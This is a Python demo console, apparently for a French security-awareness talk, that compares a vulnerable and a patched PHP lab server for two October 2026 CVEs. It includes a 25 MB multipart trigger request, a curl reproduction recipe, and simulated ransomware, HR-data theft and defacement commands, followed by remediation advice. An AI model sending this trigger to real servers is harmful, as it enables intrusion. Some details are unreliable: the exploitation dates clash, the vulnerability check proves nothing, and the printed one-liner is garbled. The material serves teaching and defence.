#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
PHP2Shell Interactive Demo Console - CVE-2026-109618 & CVE-2026-109619
Critical Remote Code Execution Vulnerabilities in PHP

CVSS: 9.2 (Critical)
CWE: CWE-416 (Use After Free)
Publication: October 21, 2026
Exploitation: Active in the wild since October 17, 2026
"""

import sys
import time
import requests
import subprocess

# Support UTF-8 on Windows
if sys.platform == "win32":
    try:
        sys.stdout.reconfigure(encoding='utf-8')
    except Exception:
        pass


# Terminal Colors
class Color:
    RED    = "\033[91m"
    GREEN  = "\033[92m"
    YELLOW = "\033[93m"
    BLUE   = "\033[94m"
    PURPLE = "\033[95m"
    CYAN   = "\033[96m"
    WHITE  = "\033[97m"
    BOLD   = "\033[1m"
    RESET  = "\033[0m"


LARGEUR = 80


def sep():
    return "\u2500" * LARGEUR


def print_header(titre):
    print(f"\n{Color.BOLD}{sep()}")
    print(f"  {titre}")
    print(f"{sep()}{Color.RESET}")


def print_step(num, titre, description):
    print(f"\n{Color.CYAN}{sep()}")
    print(f"{Color.BOLD}[Step {num}]{Color.RESET} {Color.BLUE}{titre}{Color.RESET}")
    print(f"{Color.YELLOW}\u2192 {description}{Color.RESET}")
    print(f"{Color.CYAN}{sep()}{Color.RESET}")


def print_banner():
    print(f"""{Color.RED}
  +------------------------------------------------------------------+
  |  PHP2Shell Interactive Demo Console                              |
  |  CVE-2026-109618 & CVE-2026-109619 (Critical RCE)                 |
  |                                                                  |
  |  CVSS: 9.2 (Critical)  CWE: CWE-416 (Use After Free)              |
  |  Publication: October 21, 2026                                   |
  |  Status: ACTIVELY EXPLOITED IN THE WILD                          |
  +------------------------------------------------------------------+
{Color.RESET}
{Color.BOLD}  [+] Role: External attacker (No credentials required)             {Color.RESET}
{Color.BOLD}  [+] Target: PHP 8.4.26 (vulnerable) vs PHP 8.4.27 (patched)          {Color.RESET}
{Color.BOLD}  [+] Vector: session.upload_progress.enabled + OOM trigger           {Color.RESET}
""")


def check_servers():
    """Check if servers are running"""
    print_header("STATUS DES LIEUX")
    
    servers = [
        ("localhost:8888", "VULNERABLE (PHP 8.4.26)"),
        ("localhost:8889", "PATCHED (PHP 8.4.27)")
    ]
    
    for host, label in servers:
        try:
            r = requests.get(f"http://{host}/api.php?action=status", timeout=3)
            if r.status_code == 200:
                data = r.json()
                php_version = data.get('php_version', '?')
                is_vuln = data.get('is_vulnerable', False)
                upload_progress = data.get('upload_progress_enabled', False)
                
                verdict = f"{Color.RED}VULNERABLE" if is_vuln else f"{Color.GREEN}PROTECTED"
                upload_status = f"{Color.RED}ON" if upload_progress else f"{Color.GREEN}OFF"
                
                print(f"  {label:<25} {Color.WHITE}PHP {php_version}{Color.RESET} | \u00e9tat: {verdict}{Color.RESET} | upload_progress: {upload_status}{Color.RESET}")
            else:
                print(f"  {label:<25} {Color.RED}injoignable (HTTP {r.status_code}){Color.RESET}")
        except Exception as err:
            print(f"  {label:<25} {Color.RED}injoignable ({err}){Color.RESET}")
            print(f"  {Color.YELLOW}  \u2192 lance le lab : docker compose up -d --build{Color.RESET}")
    
    print()


def cmd_status(cfg, _=None):
    """Affiche l'état des deux serveurs"""
    check_servers()


def cmd_histoire(cfg, _=None):
    """Chronologie réelle de la faille"""
    print_header("LA VRAIE HISTOIRE (tout est authentique)")
    
    timeline = [
        ("Oct 17, 2026", "Premières tentatives d'exploitation observées dans la nature"),
        ("Oct 20, 2026", "PHP Security Team notifiée de la vulnérabilité"),
        ("Oct 21, 2026", "Publication des correctifs + advisories (PHP 8.5.12, 8.4.27, 8.3.36, 8.2.35)"),
        ("Oct 21, 2026", "CERT-EU publie l'advisory SA-2026-018"),
        ("Oct 21, 2026", "Sophos publie son advisory de sécurité"),
        ("Oct 22, 2026", "Palo Alto Networks publie son analyse"),
        ("Oct 26, 2026", "CISA ajoute les CVE au KEV Database"),
        ("Oct 26, 2026", "AWS publie son bulletin de sécurité"),
        ("Nov 06, 2026", "22,6+ millions d'instances exposées (Palo Alto Networks)"),
    ]
    
    for date, event in timeline:
        print(f"  {Color.YELLOW}{date:<15}{Color.RESET} {event}")
    
    print(f"\n  {Color.BOLD}Message clé :{Color.RESET} entre la fuite et le correctif, il s'est passé {Color.RED}moins de 24h{Color.RESET}.")
    print()


def cmd_expliquer(cfg, _=None):
    """Explication grand public + version technique"""
    print_header("EXPLICATION GRAND PUBLIC")
    
    print(f"{Color.WHITE}Imaginez un restaurant :{Color.RESET}")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Un client (la requête HTTP) commande un repas.")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Le serveur (PHP) prépare la commande.")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Mais il n'a plus d'ingrédients ({Color.RED}memory_limit{Color.RESET} dépassé).")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Il abandonne la préparation et {Color.RED}longjmp(){Color.RESET} (saute l'étape de nettoyage).")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Les ingrédients restants sont {Color.RED}mal rangés{Color.RESET}.")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}Un nouveau client arrive, le serveur utilise les ingrédients mal rangés.")
    print(f"  {Color.YELLOW}\u2192 {Color.RESET}{Color.RED}INTOXICATION ALIMENTAIRE = EXECUTION DE CODE{Color.RESET}")
    
    print(f"\n{Color.BOLD}{sep()}{Color.RESET}")
    print(f"{Color.WHITE}  \ud83d\udd27 VERSION TECHNIQUE{Color.RESET}")
    print(f"{Color.BOLD}{sep()}{Color.RESET}")
    
    print(f"  Deux Use-After-Free ({Color.YELLOW}CWE-416{Color.RESET}) dans le ZEND ENGINE :")
    print()
    print(f"  {Color.RED}CVE-2026-109618{Color.RESET} : pendant le setup de la requête (parsing multipart), si le plafond")
    print(f"    {Color.CYAN}memory_limit{Color.RESET} est dépassé, PHP utilise {Color.CYAN}longjmp(){Color.RESET} pour interrompre. Les structures")
    print(f"    internes restent {Color.RED}partiellement initialisées{Color.RESET}. Le code de nettoyage les utilise")
    print(f"    comme valides -> {Color.RED}corruption mémoire{Color.RESET} -> {Color.RED}RCE{Color.RESET}.")
    print()
    print(f"  {Color.RED}CVE-2026-109619{Color.RESET} : des états internes d'une requête survivent à la libération de")
    print(f"    leur mémoire ({Color.RED}use-after-free{Color.RESET}). Une requête suivante traitée par le même worker")
    print(f"    les utilise avant initialisation -> {Color.RED}RCE + mémoire exposée{Color.RESET}.")
    print()
    print(f"  Conditions d'attaque : une requête multipart (upload), {Color.RED}aucune authentification{Color.RESET},")
    print(f"    {Color.CYAN}mod_php est le plus exposé{Color.RESET} : l'attaque réussit avant que le code applicatif tourne.")
    print()
    print(f"  {Color.RED}Sévérité : CVSS v4.0 9.2 / 10{Color.RESET} - exploitée dans la nature depuis le 21/10/2026.")
    print()


def cmd_fuite(cfg, cible=None):
    """Déclencheur REEL de la fuite mémoire"""
    print_header("DECLENCHEMENT REEL DE LA FUITE MEMOIRE (CVE-2026-109618)")
    
    cibles = {
        'vuln': 'http://localhost:8888',
        'patche': 'http://localhost:8889',
        'les-deux': None
    }
    
    if cible and cible in cibles:
        targets = [cibles[cible]] if cible != 'les-deux' else [cibles['vuln'], cibles['patche']]
    else:
        targets = [cibles['vuln']]
        print(f"  {Color.YELLOW}Utilisation: fuite vuln|patche|les-deux{Color.RESET}")
        return
    
    for target in targets:
        if not target:
            continue
            
        label = "VULNERABLE" if "8888" in target else "PATCHED"
        print(f"\n  {Color.CYAN}\u2192 Envoi d'une requête multipart massive (25 champs) vers {label}...{Color.RESET}")
        
        # Build payload
        boundary = "----PHP2ShellOOMTrigger"
        parts = [
            f"--{boundary}\r\n",
            f'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\n',
            f"upload_php2shell_demo\r\n"
        ]
        
        chunk = "A" * (1024 * 1024)  # 1MB
        for i in range(25):
            parts.append(f"--{boundary}\r\n")
            parts.append(f'Content-Disposition: form-data; name="field{i}"\r\n\r\n')
            parts.append(chunk)
        parts.append(f"--{boundary}--\r\n")
        
        payload = "".join(parts).encode('utf-8')
        
        headers = {
            'Content-Type': 'multipart/form-data; boundary=' + boundary,
            'Content-Length': str(len(payload))
        }
        
        try:
            start = time.time()
            r = requests.post(f"{target}/upload.php", data=payload, headers=headers, timeout=15)
            elapsed = time.time() - start
            
            peak = len(payload)
            
            if r.status_code == 200:
                print(f"  {Color.GREEN}\u2713 Requête traitée en {elapsed:.2f}s{Color.RESET}")
                print(f"  {Color.YELLOW}  \u2192 Pic mémoire : {peak} octets{Color.RESET}")
                print(f"  {Color.RED}\u2717 SERVEUR {label} : Use-After-Free possible !{Color.RESET}")
            elif r.status_code == 403:
                print(f"  {Color.GREEN}\u2713 Serveur protégé : nettoyage mémoire correct{Color.RESET}")
            else:
                print(f"  {Color.YELLOW}? Réponse HTTP {r.status_code}{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}")
    
    print()


def cmd_recette(cfg, _=None):
    """Reproduction manuelle (curl) pour montrer que tu pilotes"""
    print_header("REPRODUCTION MANUELLE (pour montrer que TU pilotes)")
    
    print(f"  Copie-colle ces commandes dans un terminal :\n")
    
    print(f"  {Color.CYAN}1. Vérifier l'état du serveur vulnérable :{Color.RESET}")
    print(f"     {Color.WHITE}curl -s http://localhost:8888/api.php?action=status | jq{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}2. Vérifier que session.upload_progress est activé :{Color.RESET}")
    print(f"     {Color.WHITE}curl -s http://localhost:8888/api.php?action=status | jq '.upload_progress_enabled'{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}3. Créer un payload OOM (25MB multipart) :{Color.RESET}")
    print(f"     {Color.WHITE}python -c \"")
    print(f"     boundary='----PHP2ShellOOMTrigger'\\{Color.RESET}")
    print(f"{Color.WHITE}     parts=['--\\${boundary}']\\{Color.RESET}")
    print(f"{Color.WHITE}     for i in range(25):\\{Color.RESET}")
    print(f"{Color.WHITE}         parts.append(f'--\\${boundary}\\nContent-Disposition: form-data; name=\\"field\\${i}\\"\\\n\\\n')\\{Color.RESET}")
    print(f"{Color.WHITE}         parts.append('A'*1048576)\\n'\\{Color.RESET}")
    print(f"{Color.WHITE}     parts.append(f'--\\${boundary}--')\\{Color.RESET}")
    print(f"{Color.WHITE}     payload=''.join(parts).encode()\\{Color.RESET}")
    print(f"{Color.WHITE}     with open('payload.txt','wb') as f: f.write(payload)\"{Color.RESET}")
    print(f"{Color.WHITE}     \"{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}4. Envoyer le payload au serveur vulnérable :{Color.RESET}")
    print(f"     {Color.WHITE}curl -X POST http://localhost:8888/upload.php \\{Color.RESET}")
    print(f"{Color.WHITE}       --data-binary @payload.txt{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}5. Vérifier que l'attaque est bloquée sur le serveur patché :{Color.RESET}")
    print(f"     {Color.WHITE}curl -X POST http://localhost:8889/upload.php \\{Color.RESET}")
    print(f"{Color.WHITE}       --data-binary @payload.txt{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}6. Déclencher un rançongiciel sur le serveur vulnérable :{Color.RESET}")
    print(f"     {Color.WHITE}curl -X POST http://localhost:8888/api.php -d 'action=ransomware'{Color.RESET}")
    print()
    
    print(f"  {Color.CYAN}7. Vérifier que l'attaque est bloquée sur le serveur patché :{Color.RESET}")
    print(f"     {Color.WHITE}curl -X POST http://localhost:8889/api.php -d 'action=ransomware'{Color.RESET}")
    print()


def cmd_ransomware(cfg, cible=None):
    """Déploie le rançongiciel"""
    print_header("DEPLOIEMENT RANSOMWARE")
    
    cibles = {
        'vuln': 'http://localhost:8888',
        'patche': 'http://localhost:8889',
        'les-deux': None
    }
    
    if cible and cible in cibles:
        targets = [cibles[cible]] if cible != 'les-deux' else [cibles['vuln'], cibles['patche']]
    else:
        targets = [cibles['vuln']]
        print(f"  {Color.YELLOW}Utilisation: ransomware vuln|patche|les-deux{Color.RESET}")
        return
    
    for target in targets:
        if not target:
            continue
            
        label = "VULNERABLE" if "8888" in target else "PATCHED"
        print(f"\n  {Color.CYAN}\u2192 Déploiement du rançongiciel sur {label}...{Color.RESET}")
        
        try:
            r = requests.post(f"{target}/api.php", data={"action": "ransomware"}, timeout=5)
            
            if r.status_code == 200:
                print(f"  {Color.RED}\u2717 MOTEUR NON CORRIGE{Color.RESET}")
                time.sleep(0.5)
                print(f"  {Color.YELLOW}  \u2192 Le portail affiche la rançon !{Color.RESET}")
                ok = True
            elif r.status_code == 403:
                print(f"  {Color.GREEN}\u2713 CORRECTIF ACTIF{Color.RESET}")
                time.sleep(0.5)
                print(f"  {Color.YELLOW}  \u2192 Attaque bloquée (HTTP 403){Color.RESET}")
                ok = False
            else:
                print(f"  {Color.YELLOW}? Code HTTP : {r.status_code}{Color.RESET}")
                ok = False
            
            etat = f"{Color.RED}compromis \u2717{Color.RESET}" if ok else f"{Color.GREEN}protégé \u2713{Color.RESET}"
            print(f"\n  {Color.YELLOW}\ud83d\udc49 Regarde le navigateur : le site {etat}{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}")
    
    print()


def cmd_vol(cfg, cible=None):
    """Exfiltre la base de données RH"""
    print_header("EXFILTRATION DE LA BASE DE DONNEES RH")
    
    cibles = {
        'vuln': 'http://localhost:8888',
        'patche': 'http://localhost:8889',
        'les-deux': None
    }
    
    if cible and cible in cibles:
        targets = [cibles[cible]] if cible != 'les-deux' else [cibles['vuln'], cibles['patche']]
    else:
        targets = [cibles['vuln']]
        print(f"  {Color.YELLOW}Utilisation: vol vuln|patche|les-deux{Color.RESET}")
        return
    
    for target in targets:
        if not target:
            continue
            
        label = "VULNERABLE" if "8888" in target else "PATCHED"
        print(f"\n  {Color.CYAN}\u2192 Exfiltration des données RH sur {label}...{Color.RESET}")
        
        try:
            r = requests.post(f"{target}/api.php", data={"action": "steal"}, timeout=5)
            
            if r.status_code == 200:
                data = r.json()
                stolen = data.get("stolen_data", [])
                print(f"  {Color.GREEN}\u2713 RCE confirmée ! Extraction directe de la base de données...{Color.RESET}\n")
                time.sleep(0.4)

                print(f"{Color.RED}{Color.BOLD}=== [DONNEES CONFIDENTIELLES EXFILTREES] ==={Color.RESET}")
                print(f"{Color.CYAN}{'-' * 84}{Color.RESET}")
                print(f"{Color.BOLD}{'NOM & PRENOM':<18} | {'POSTE':<20} | {'SALAIRE':<9} | {'MOT DE PASSE':<16}{Color.RESET}")
                print(f"{Color.CYAN}{'-' * 84}{Color.RESET}")

                csv_file = "DONNEES_RH_EXFILTREES.csv"
                import csv
                with open(csv_file, mode="w", newline="", encoding="utf-8-sig") as f:
                    writer = csv.writer(f, delimiter=";")
                    writer.writerow(["Nom", "Poste", "Salaire Net", "Mot de passe", "N° Securite Sociale", "IBAN"])
                    for emp in stolen:
                        writer.writerow([emp['nom'], emp['poste'], emp['salaire'], emp['password'], emp['secu'], emp['iban']])
                        print(f"  {Color.WHITE}{emp['nom']:<18}{Color.RESET} | {Color.YELLOW}{emp['poste']:<20}{Color.RESET} | {Color.GREEN}{emp['salaire']:<9}{Color.RESET} | {Color.RED}{emp['password']:<16}{Color.RESET} | {Color.WHITE}{emp['secu']}{Color.RESET}")

                print(f"{Color.CYAN}{'-' * 84}{Color.RESET}\n")
                print(f"  {Color.GREEN}[+] Fichier créé : {Color.BOLD}{csv_file}{Color.RESET} (prêt pour la séance)")
                ok = True
            elif r.status_code == 403:
                print(f"  {Color.GREEN}\u2713 Attaque bloquée : {r.json().get('message', 'HTTP 403')}{Color.RESET}")
                ok = False
            else:
                print(f"  {Color.YELLOW}? Code HTTP : {r.status_code}{Color.RESET}")
                ok = False
            
            etat = f"{Color.RED}compromis \u2717{Color.RESET}" if ok else f"{Color.GREEN}protégé \u2713{Color.RESET}"
            print(f"\n  {Color.YELLOW}\ud83d\udc49 Le portail affiche la bannière d'alerte \u00ab fuite de données en cours \u00bb{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}")
    
    print()


def cmd_deface(cfg, cible=None):
    """Défigurer le site web"""
    print_header("DEFACEMENT DU SITE WEB")
    
    cibles = {
        'vuln': 'http://localhost:8888',
        'patche': 'http://localhost:8889',
        'les-deux': None
    }
    
    if cible and cible in cibles:
        targets = [cibles[cible]] if cible != 'les-deux' else [cibles['vuln'], cibles['patche']]
    else:
        targets = [cibles['vuln']]
        print(f"  {Color.YELLOW}Utilisation: deface vuln|patche|les-deux{Color.RESET}")
        return
    
    for target in targets:
        if not target:
            continue
            
        label = "VULNERABLE" if "8888" in target else "PATCHED"
        print(f"\n  {Color.CYAN}\u2192 Déface du site sur {label}...{Color.RESET}")
        
        try:
            r = requests.post(f"{target}/api.php", data={"action": "deface"}, timeout=5)
            
            if r.status_code == 200:
                print(f"  {Color.RED}\u2717 MOTEUR NON CORRIGE{Color.RESET}")
                time.sleep(0.5)
                print(f"  {Color.YELLOW}  \u2192 Logo et contenu écrasés !{Color.RESET}")
                ok = True
            elif r.status_code == 403:
                print(f"  {Color.GREEN}\u2713 CORRECTIF ACTIF{Color.RESET}")
                time.sleep(0.5)
                print(f"  {Color.YELLOW}  \u2192 Attaque bloquée (HTTP 403){Color.RESET}")
                ok = False
            else:
                print(f"  {Color.YELLOW}? Code HTTP : {r.status_code}{Color.RESET}")
                ok = False
            
            etat = f"{Color.RED}défacé \u2717{Color.RESET}" if ok else f"{Color.GREEN}protégé \u2713{Color.RESET}"
            print(f"\n  {Color.YELLOW}\ud83d\udc49 Regarde le site : le logo et tout le contenu ont été {etat}!{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}")
    
    print()


def cmd_restore(cfg, _=None):
    """Restaurer les sites"""
    print_header("RESTAURATION DES SITES")
    
    targets = ['http://localhost:8888', 'http://localhost:8889']
    
    for target in targets:
        print(f"\n  {Color.CYAN}\u2192 Restauration de {target}...{Color.RESET}")
        
        try:
            r = requests.post(f"{target}/api.php", data={"action": "restore"}, timeout=5)
            
            if r.status_code == 200:
                print(f"  {Color.GREEN}\u2713 Site restauré avec succès{Color.RESET}")
            else:
                print(f"  {Color.RED}\u2717 Erreur : HTTP {r.status_code}{Color.RESET}")
        except Exception as e:
            print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}")
    
    print(f"\n  {Color.YELLOW}\ud83d\udc49 Les portails redeviennent sains instantanément (recharge la page).{Color.RESET}\n")


def cmd_duel(cfg, _=None):
    """Comparaison des serveurs"""
    print_header("DUEL : UNE SEULE MISE A JOUR CHANGE TOUT")
    
    print(f"\n  {Color.RED}1. Rançongiciel sur le serveur NON corrigé (PHP 8.4.26, :8888)…{Color.RESET}")
    try:
        r = requests.post("http://localhost:8888/api.php", data={"action": "ransomware"}, timeout=5)
        if r.status_code == 200:
            print(f"  {Color.RED}\u2717 RESULTAT : VULNERABLE — Le portail affiche la rançon.{Color.RESET}\n")
    except Exception as e:
        print(f"  {Color.RED}\u2717 Erreur : {e}{Color.RESET}\n")
    
    print(f"  {Color.GREEN}2. La MEME attaque sur le serveur corrigé (PHP 8.4.27, :8889)…{Color.RESET}")
    try:
        r = requests.post("http://localhost:8889/api.php", data={"action": "ransomware"}, timeout=5)
        if r.status_code == 403:
            print(f"  {Color.GREEN}\u2713 RESULTAT : ATTAQUE BLOQUEE — HTTP 403{Color.RESET}\n")
    except Exception as e:
        print(f"  {Color.GREEN}\u2713 Erreur : {e}{Color.RESET}\n")
    
    print(f"{Color.CYAN}{sep()}{Color.RESET}")
    print(f"  PHP 8.4.26 (:8888) : {Color.RED}\u2717 compromis en une requête{Color.RESET}")
    print(f"  PHP 8.4.27 (:8889) : {Color.GREEN}\u2713 attaque rejetée net (HTTP 403){Color.RESET}")
    print(f"\n{Color.BOLD}Conclusion pour la direction et les équipes :{Color.RESET}")
    print(f"{Color.WHITE}Entre 8.4.26 et 8.4.27 il y a {Color.BOLD}UN SEUL numéro de version{Color.RESET} — celui du")
    print(f"{Color.WHITE}correctif qui change tout.{Color.RESET}\n")
    print(f"(Tape {Color.CYAN}restore{Color.RESET} pour remettre les portails à neuf.)\n")


def cmd_remediation(cfg, _=None):
    """Mesures de remédiation"""
    print_header("MESURES DE REMEDIATION (Recommandations officielles)")
    
    print(f"  {Color.GREEN}1. METTRE A JOUR PHP vers la branche corrigée{Color.RESET}")
    print(f"     \u2192 PHP 8.5.x → 8.5.12 ou supérieur")
    print(f"     \u2192 PHP 8.4.x → 8.4.27 ou supérieur")
    print(f"     \u2192 PHP 8.3.x → 8.3.36 ou supérieur")
    print(f"     \u2192 PHP 8.2.x → 8.2.35 ou supérieur")
    print()
    
    print(f"  {Color.GREEN}2. REDEMARRER LES WORKERS après la mise à jour{Color.RESET}")
    print(f"     \u2192 La mise à jour disque ne suffit PAS : libphp.so / php-fpm restent résidents")
    print(f"     \u2192 Commandes :")
    print(f"        {Color.WHITE}sudo apachectl restart  # Apache + mod_php{Color.RESET}")
    print(f"        {Color.WHITE}sudo systemctl restart php-fpm  # PHP-FPM{Color.RESET}")
    print()
    
    print(f"  {Color.GREEN}3. GARDER « SESSION UPLOAD PROGRESS » DESACTIVE (même après le patch){Color.RESET}")
    print(f"     \u2192 php.ini / pool FPM ou serveur, pas ini_set ni .user.ini")
    print(f"     \u2192 {Color.WHITE}session.upload_progress.enabled = 0{Color.RESET}")
    print(f"     \u2192 Cette mesure couvre aussi la CVE-2026-115560")
    print()
    
    print(f"  {Color.GREEN}4. PHP 8.5 : désactiver les backtraces d'erreurs fatales{Color.RESET}")
    print(f"     \u2192 {Color.WHITE}fatal_error_backtraces = 0{Color.RESET}")
    print()
    
    print(f"  {Color.GREEN}5. BLOQUER MULTIPART/FORM-DATA INUTILE (mesure d'attente){Color.RESET}")
    print(f"     \u2192 Si votre application n'utilise pas les uploads multipart")
    print()
    
    print(f"  {Color.GREEN}6. CASSE-TETE PHP EOL (≤ 8.1) : aucun correctif officiel{Color.RESET}")
    print(f"     \u2192 Utiliser un correctif de la distribution ou du fournisseur LTS")
    print(f"     \u2192 Ou migrer vers une version supportée")
    print()
    
    print(f"  {Color.GREEN}7. INVENTAIRE COMPLET{Color.RESET}")
    print(f"     \u2192 Identifier tous les systèmes utilisant PHP")
    print(f"     \u2192 Vérifier les versions et appliquer les mises à jour")
    print()
    
    print(f"  {Color.GREEN}8. TRACER LA MISE A JOUR (preuve datée){Color.RESET}")
    print(f"     \u2192 Documenter les actions de remédiation")
    print(f"     \u2192 Conserver les logs pour audit")
    print()
    
    print(f"  {Color.GREEN}9. Urgence objective{Color.RESET}")
    print(f"     \u2192 Ces vulnérabilités sont exploitées activement")
    print(f"     \u2192 Score CVSS 9.2/10 = Critique")
    print(f"     \u2192 Impact : Exécution de code arbitraire à distance")
    print()


def cmd_demo(cfg, _=None):
    """Démo complète"""
    print_header("DEMO COMPLETE AUTOMATIQUE")
    
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Voici deux serveurs jumeaux. Le premier exécute PHP 8.4.26,")
    print(f"  le second 8.4.27, publié le 21 octobre 2026 pour corriger CVE-2026-109618 et 109619. ")
    print(f"  Aucun mot de passe, aucun compte. Juste un formulaire énorme. »\n")
    
    # Check servers
    cmd_status(cfg, None)
    
    # Trigger OOM
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Regardez bien. Je vais envoyer une requête qui dépasse la")
    print(f"  limite mémoire. »\n")
    cmd_fuite(cfg, 'vuln')
    
    # Ransomware
    print(f"  {Color.BOLD}À dire :{Color.RESET} « Un seul numéro de version les sépare. Regardez. »\n")
    cmd_ransomware(cfg, 'les-deux')
    
    # Data theft
    cmd_vol(cfg, 'vuln')
    
    # Deface
    cmd_deface(cfg, 'vuln')
    
    # Duel
    cmd_duel(cfg, None)
    
    # Remediation
    cmd_remediation(cfg, None)
    
    # Restore
    cmd_restore(cfg, None)
    
    print(f"\n{Color.BOLD}Demo terminée !{Color.RESET}\n")


def cmd_aide(cfg, _=None):
    """Affiche l'aide"""
    print_header("AIDE - Commandes disponibles")
    
    commandes = {
        'status': 'État des deux serveurs (versions, verrou)',
        'histoire': 'La chronologie réelle de la faille (octobre 2026)',
        'expliquer': 'Explication grand public + version technique',
        'fuite [cible]': 'Déclencheur REEL de la fuite mémoire (cible : vuln|patche|les-deux)',
        'recette': 'Reproduction manuelle (curl) pour montrer que tu pilotes',
        'ransomware [cible]': 'Déploie le rançongiciel sur le portail',
        'vol [cible]': 'Exfiltre la base RH (salaires, mots de passe, IBAN)',
        'deface [cible]': 'Déface le site web',
        'restore': 'Restaurer les portails à neuf',
        'duel': 'Comparaison des deux serveurs',
        'remediation': 'Mesures de remédiation officielles',
        'demo': 'Démo complète automatique',
        'aide': 'Affiche cette aide',
        'quitter': 'Quitter'
    }
    
    for cmd, desc in commandes.items():
        print(f"  {Color.CYAN}{cmd:<15}{Color.RESET} {desc}")
    
    print()


# Command mapping
COMMANDES = {
    'status': cmd_status,
    'histoire': cmd_histoire,
    'expliquer': cmd_expliquer,
    'fuite': cmd_fuite,
    'recette': cmd_recette,
    'ransomware': cmd_ransomware,
    'vol': cmd_vol,
    'deface': cmd_deface,
    'restore': cmd_restore,
    'duel': cmd_duel,
    'remediation': cmd_remediation,
    'demo': cmd_demo,
    'aide': cmd_aide,
    'quitter': None
}


AIDE = f"""\n{Color.BOLD}COMMANDES DISPONIBLES{Color.RESET}
  {Color.CYAN}status{Color.RESET}                     etat des deux serveurs (versions, verrou)
  {Color.CYAN}histoire{Color.RESET}                   la chronologie reale de la faille (octobre 2026)
  {Color.CYAN}expliquer{Color.RESET}                   explication grand public + version technique
  {Color.CYAN}fuite [cible]{Color.RESET}               declencheur REEL de la fuite memoire (cible : vuln|patche|les-deux)
  {Color.CYAN}recette{Color.RESET}                    reproduction manuelle (curl) pour montrer que tu pilotes
  {Color.CYAN}ransomware [cible]{Color.RESET}          deploie le ransomware sur le portail
  {Color.CYAN}vol [cible]{Color.RESET}                exfiltre la base RH (salaires, mots de passe, IBAN)
  {Color.CYAN}deface [cible]{Color.RESET}             defacer le site web
  {Color.CYAN}restore{Color.RESET}                    restaurer les portails a neuf
  {Color.CYAN}duel{Color.RESET}                       comparaison des deux serveurs
  {Color.CYAN}remediation{Color.RESET}                 mesures de correction officielles
  {Color.CYAN}demo{Color.RESET}                       demo complete automatique
  {Color.CYAN}aide{Color.RESET}                       affiche l'aide
  {Color.CYAN}quitter{Color.RESET}                    quitter
"""


def main():
    print_banner()
    
    # Configuration
    cfg = type('Config', (), {})()
    cfg.parties = 25  # Number of multipart parts
    
    while True:
        try:
            # Check servers status
            check_servers()
            
            # Get user input
            cmd_input = input(f"{Color.CYAN}[PHP2Shell]{Color.RESET} > ").strip()
            
            if not cmd_input:
                continue
            
            # Parse command
            parts = cmd_input.split()
            cmd = parts[0].lower()
            args = parts[1:] if len(parts) > 1 else None
            
            # Execute command
            if cmd in COMMANDES:
                if cmd == 'quitter':
                    print(f"\n{Color.YELLOW}Au revoir !{Color.RESET}\n")
                    break
                
                if args and len(args) > 0:
                    COMMANDES[cmd](cfg, args[0])
                else:
                    COMMANDES[cmd](cfg, None)
            else:
                print(f"\n{Color.RED}Commande inconnue : {cmd}{Color.RESET}")
                print(AIDE)
        
        except KeyboardInterrupt:
            print(f"\n\n{Color.YELLOW}Utilise 'quitter' pour sortir proprement.{Color.RESET}\n")
        except EOFError:
            print(f"\n{Color.YELLOW}Au revoir !{Color.RESET}\n")
            break
        except Exception as e:
            print(f"\n{Color.RED}Erreur : {e}{Color.RESET}\n")


if __name__ == '__main__':
    main()
